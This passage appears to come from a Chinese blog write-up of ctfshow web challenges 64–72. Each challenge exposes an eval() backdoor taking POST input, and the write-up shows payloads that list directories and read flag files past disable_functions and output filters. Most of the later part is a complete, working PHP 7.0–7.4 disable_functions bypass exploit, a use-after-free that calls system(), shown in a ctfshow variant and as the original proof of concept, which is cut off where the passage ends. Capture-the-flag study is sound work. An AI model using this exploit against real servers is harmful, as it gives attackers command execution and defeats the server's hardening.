class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-36-Web-64-—-disable-functions"><a href="#1-36-Web-64-—-disable-functions" class="headerlink" title="1.36 Web 64 — disable_functions"></a>1.36 Web 64 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-37-Web-65-—-disable-functions"><a href="#1-37-Web-65-—-disable-functions" class="headerlink" title="1.37 Web 65 — disable_functions"></a>1.37 Web 65 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-38-Web-66-—-disable-functions"><a href="#1-38-Web-66-—-disable-functions" class="headerlink" title="1.38 Web 66 — disable_functions"></a>1.38 Web 66 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><p>尝试之前的读取文件的函数以及写入文件、重命名等等都被禁用</p><p>但是 <code>highlight_file()</code> 能够使用</p><p><img src="https://i.loli.net/2021/07/30/fR3iKbqkhmP8gXp.png" alt="image-20210730212109031"></p><p>显然换了位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="comment">#查文件# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )c=highlight_file(&#x27;/flag.txt&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="1-39-Web-67-—-disable-functions-—-var-dump-scandir-‘-‘"><a href="#1-39-Web-67-—-disable-functions-—-var-dump-scandir-‘-‘" class="headerlink" title="1.39 Web 67 — disable_functions — var_dump(scandir(‘/‘));"></a>1.39 Web 67 — disable_functions — var_dump(scandir(‘/‘));</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);<span class="comment"># print_r() 被过滤 var_dump() 代替c=var_dump(scandir(&#x27;/&#x27;));c=highlight_file(&#x27;/flag.txt&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="1-40-Web-68-—-disable-functions-—-include-“-flag-txt”"><a href="#1-40-Web-68-—-disable-functions-—-include-“-flag-txt”" class="headerlink" title="1.40 Web 68 — disable_functions  — include(“/flag.txt”);"></a>1.40 Web 68 — disable_functions  — include(“/flag.txt”);</h2><p>直接显示 highlight_file() 被禁用</p><p>文件包含 include</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="comment"># highlight_file() 被禁用  利用文件包含c=include(&quot;/flag.txt&quot;);# include函数会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。文件内容有代码则执行代码，否则直接输出。</span></span><br></pre></td></tr></table></figure><h2 id="1-41-Web-69-—-disable-functions-—-var-export-scandir-‘-‘"><a href="#1-41-Web-69-—-disable-functions-—-var-export-scandir-‘-‘" class="headerlink" title="1.41 Web 69 — disable_functions — var_export(scandir(‘/‘));"></a>1.41 Web 69 — disable_functions — var_export(scandir(‘/‘));</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));c=include(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-42-Web-70"><a href="#1-42-Web-70" class="headerlink" title="1.42 Web 70"></a>1.42 Web 70</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));c=include(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-43-Web-71-—-disable-functions-—-exit"><a href="#1-43-Web-71-—-disable-functions-—-exit" class="headerlink" title="1.43 Web 71 — disable_functions — exit();"></a>1.43 Web 71 — disable_functions — exit();</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);ini_set(<span class="string">&#x27;display_errors&#x27;</span>, 0);// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);        <span class="variable">$s</span> = ob_get_contents();        ob_end_clean();        <span class="built_in">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/30/PK3vJ9uVDpkQTAE.png" alt="image-20210730213843253"></p><p>将所有的 字母、数字换成了 <code>?</code></p><p>强制退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);<span class="built_in">exit</span>();<span class="comment">#禁用c=var_export(scandir(&#x27;/&#x27;));exit();c=include(&#x27;/flag.txt&#x27;);die();</span></span><br></pre></td></tr></table></figure><h2 id="列目录新姿势"><a href="#列目录新姿势" class="headerlink" title="列目录新姿势"></a>列目录新姿势</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); // 列当前目录print_r(glob(<span class="string">&quot;/*&quot;</span>)); // 列根目录print_r(scandir(<span class="string">&quot;.&quot;</span>));print_r(scandir(<span class="string">&quot;/&quot;</span>));<span class="variable">$d</span>=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="built_in">echo</span><span class="string">&quot;<span class="variable">$f</span>\n&quot;</span>;&#125;<span class="variable">$d</span>=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;<span class="built_in">read</span>()))&#123;<span class="built_in">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;<span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$value</span>)&#123;<span class="built_in">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&#x27;glob:///*&#x27;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=scandir(<span class="string">&quot;/&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$value</span>)&#123;<span class="built_in">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=glob(<span class="string">&quot;/*&quot;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$value</span>)&#123;<span class="built_in">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=new DirectoryIterator(<span class="string">&#x27;glob:///*&#x27;</span>);foreach(<span class="variable">$a</span> as <span class="variable">$f</span>)&#123;<span class="built_in">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dir</span> = new DirectoryIterator(dirname(__FILE__));foreach (<span class="variable">$dir</span> as <span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;isFile())&#123;        <span class="built_in">echo</span> <span class="variable">$file</span>-&gt;getFilename().<span class="string">&quot;&lt;br /&gt;&quot;</span>;    &#125;&#125;<span class="built_in">exit</span>(0);c=<span class="variable">$dir</span> = new DirectoryIterator(dirname(__FILE__));foreach(<span class="variable">$dir</span> as <span class="variable">$file</span>)&#123;<span class="built_in">print</span>(<span class="variable">$file</span>-&gt;getFilename());&#125;;<span class="built_in">exit</span>(0);c=<span class="variable">$dir</span> = new DirectoryIterator(<span class="string">&quot;glob:///*&quot;</span>);foreach(<span class="variable">$dir</span> as <span class="variable">$file</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span>-&gt;getFilename().<span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;;<span class="built_in">exit</span>(0);</span><br></pre></td></tr></table></figure><blockquote><p>ob_get_contents函数获得缓冲区的内容，即在此为代码执行的输出结果</p><p>在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。</p><p>ob_end_clean函数清除缓冲区的内容。</p><p>此时得用一个函数ob_get_contents()在ob_end_clean()前面来获得缓冲区的内容。<br>这样的话，能将在执行ob_end_clean()前把内容保存到一个变量中，然后在ob_end_clean()函数执行后对这个变量做操作。</p><p>exit() 函数输出一条消息，并退出当前脚本。</p><p>那么在执行完代码之后结束脚本的运行就可以了</p></blockquote><h2 id="1-44-Web-72-—-disable-functions-—-php7-backtrace-bypass-脚本"><a href="#1-44-Web-72-—-disable-functions-—-php7-backtrace-bypass-脚本" class="headerlink" title="1.44 Web 72 — disable_functions — php7-backtrace-bypass 脚本"></a>1.44 Web 72 — disable_functions — php7-backtrace-bypass 脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);ini_set(<span class="string">&#x27;display_errors&#x27;</span>, 0);// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);        <span class="variable">$s</span> = ob_get_contents();        ob_end_clean();        <span class="built_in">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/30/xog4phV91mJNY6G.png" alt="image-20210730215322657"></p><p><strong>php7-backtrace-bypass 脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">function</span> ctfshow(<span class="variable">$cmd</span>) &#123;    global <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;    class Vuln &#123;        public <span class="variable">$a</span>;        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;             global <span class="variable">$backtrace</span>;             <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;a);            <span class="variable">$backtrace</span> = (new Exception)-&gt;getTrace();            <span class="keyword">if</span>(!isset(<span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>])) &#123;                <span class="variable">$backtrace</span> = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;    &#125;    <span class="keyword">function</span> str2ptr(&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;        <span class="variable">$address</span> = 0;        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-1; <span class="variable">$j</span> &gt;= 0; <span class="variable">$j</span>--) &#123;            <span class="variable">$address</span> &lt;&lt;= 8;            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);        &#125;        <span class="built_in">return</span> <span class="variable">$address</span>;    &#125;    <span class="keyword">function</span> ptr2str(<span class="variable">$ptr</span>, <span class="variable">$m</span> = 8) &#123;        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;        <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; 0xff));            <span class="variable">$ptr</span> &gt;&gt;= 8;        &#125;        <span class="built_in">return</span> <span class="variable">$out</span>;    &#125;    <span class="keyword">function</span> write(&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = 8) &#123;        <span class="variable">$i</span> = 0;        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; 0xff));            <span class="variable">$v</span> &gt;&gt;= 8;        &#125;    &#125;    <span class="keyword">function</span> leak(<span class="variable">$addr</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;        global <span class="variable">$abc</span>, <span class="variable">$helper</span>;        write(<span class="variable">$abc</span>, 0x68, <span class="variable">$addr</span> + <span class="variable">$p</span> - 0x10);        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);        <span class="keyword">if</span>(<span class="variable">$s</span> != 8) &#123; <span class="variable">$leak</span> %= 2 &lt;&lt; (<span class="variable">$s</span> * 8) - 1; &#125;        <span class="built_in">return</span> <span class="variable">$leak</span>;    &#125;    <span class="keyword">function</span> parse_elf(<span class="variable">$base</span>) &#123;        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, 0x10, 2);        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, 0x20);        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, 0x36, 2);        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, 0x38, 2);        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, 0, 4);            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, 4, 4);            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, 0x10);            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, 0x28);            <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 6) &#123;                 <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == 2 ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 5) &#123;                 <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;            &#125;        &#125;        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)            <span class="built_in">return</span> <span class="literal">false</span>;        <span class="built_in">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];    &#125;    <span class="keyword">function</span> get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>) &#123;        list(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / 8; <span class="variable">$i</span>++) &#123;            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * 8);            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);                                <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x746e6174736e6f63)                    <span class="built_in">continue</span>;            &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + 4) * 8);            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);                                <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x786568326e6962)                    <span class="built_in">continue</span>;            &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;            <span class="built_in">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * 8;        &#125;    &#125;    <span class="keyword">function</span> get_binary_base(<span class="variable">$binary_leak</span>) &#123;        <span class="variable">$base</span> = 0;        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; 0xfffffffffffff000;        <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x1000; <span class="variable">$i</span>++) &#123;            <span class="variable">$addr</span> = <span class="variable">$start</span> - 0x1000 * <span class="variable">$i</span>;            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, 0, 7);            <span class="keyword">if</span>(<span class="variable">$leak</span> == 0x10102464c457f) &#123;                <span class="built_in">return</span> <span class="variable">$addr</span>;            &#125;        &#125;    &#125;    <span class="keyword">function</span> get_system(<span class="variable">$basic_funcs</span>) &#123;        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;        <span class="keyword">do</span> &#123;            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, 0, 6);            <span class="keyword">if</span>(<span class="variable">$f_name</span> == 0x6d6574737973) &#123;                <span class="built_in">return</span> leak(<span class="variable">$addr</span> + 8);            &#125;            <span class="variable">$addr</span> += 0x20;        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != 0);        <span class="built_in">return</span> <span class="literal">false</span>;    &#125;    <span class="keyword">function</span> trigger_uaf(<span class="variable">$arg</span>) &#123;        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);        <span class="variable">$vuln</span> = new Vuln();        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;    &#125;    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;        die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);    &#125;    <span class="variable">$n_alloc</span> = 10;     <span class="variable">$contiguous</span> = [];    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>][0];    <span class="variable">$helper</span> = new Helper;    <span class="variable">$helper</span>-&gt;b = <span class="keyword">function</span> (<span class="variable">$x</span>) &#123; &#125;;    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == 79 || strlen(<span class="variable">$abc</span>) == 0) &#123;        die(<span class="string">&quot;UAF failed&quot;</span>);    &#125;    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, 0);    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, 0x58);    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - 0xc8;    write(<span class="variable">$abc</span>, 0x60, 2);    write(<span class="variable">$abc</span>, 0x70, 6);    write(<span class="variable">$abc</span>, 0x10, <span class="variable">$abc_addr</span> + 0x60);    write(<span class="variable">$abc</span>, 0x18, 0xa);    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, 0x20);    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, 8);    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;        die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;        die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;        die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);    &#125;    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;        die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);    &#125;    <span class="variable">$fake_obj_offset</span> = 0xd0;    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x110; <span class="variable">$i</span> += 8) &#123;        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));    &#125;    write(<span class="variable">$abc</span>, 0x20, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);    write(<span class="variable">$abc</span>, 0xd0 + 0x38, 1, 4);     write(<span class="variable">$abc</span>, 0xd0 + 0x68, <span class="variable">$zif_system</span>);     (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);    <span class="built_in">exit</span>();&#125;ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;constant&#x27; constant check                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                # &#x27;bin2hex&#x27; constant check                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;   